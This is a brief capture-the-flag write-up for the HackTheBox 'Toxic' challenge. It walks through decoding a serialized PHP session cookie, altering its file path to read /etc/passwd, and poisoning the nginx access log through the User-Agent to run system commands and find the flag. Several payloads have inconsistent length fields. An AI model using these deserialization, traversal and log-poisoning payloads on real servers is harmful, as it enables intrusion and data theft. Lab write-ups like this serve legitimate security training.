#  Toxic HTB Challenge 

__________________________________________

Intercept with burpsuite and look at the **PHPSESSID**, has a base64 encoded string.

After being decoded, it shows this: 
```
O:9:"PageModel":1:{s:4:"file";s:25:"/www/index.html";}
```

Changing the path (carefull with the size "s:25", if do not see anything try to play with it) it will show the file chosen like this:
```
O:9:"PageModel":1:{s:4:"file";s:25:"../../../../etc/passwd}
```
## Flag

With this payload we can see that the server will log the User Agent. 
`O:9:"PageModel":1:{s:4:"file";s:25:"/var/log/nginx/access.log";}`

If we inject a php script into the user agent we can achieve RCE: 
```php
<?php system('id');?>
```

So we can now look for the flag.
```php
<?php system('ls -la /static/');?>
```
Once we got the filename for the flag we go back to the PHPSESSID and look at the flag:

```
O:9:"PageModel":1:{s:4:"file";s:11:"/static/flag_xxxx";}
```